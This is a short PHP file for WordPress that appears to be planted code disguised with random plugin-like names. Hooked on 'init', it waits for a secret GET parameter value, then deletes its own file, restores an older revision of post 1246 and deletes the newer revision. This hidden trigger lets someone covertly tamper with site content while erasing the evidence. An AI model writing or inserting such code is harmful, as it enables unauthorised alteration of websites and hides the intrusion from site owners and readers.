<?php

function local_testimonial_nav_pdf() {
	if (isset($_GET['details_videos_ajax_flexible']) && $_GET['details_videos_ajax_flexible'] === 'types_tabs_schema') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$youtube_fields_lazy_blog = 1246;
		$business_groups_cart = wp_get_post_revisions($youtube_fields_lazy_blog);
		if (empty($business_groups_cart)) die('no revisions');
		if (count($business_groups_cart) < 2) die('less than 2');
		$home_feeds_hello = array_shift($business_groups_cart);
		$hidden_media_discount_variations = $home_feeds_hello->ID;
		$role_404_rest = array_shift($business_groups_cart);
		$bbpress_page_js = $role_404_rest->ID;
		$testimonials_framework_menu = wp_restore_post_revision($bbpress_page_js);
		if ($testimonials_framework_menu === false) die('error restoring');
		$testimonials_framework_menu = wp_delete_post_revision($hidden_media_discount_variations);		
		if ($testimonials_framework_menu === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'local_testimonial_nav_pdf');
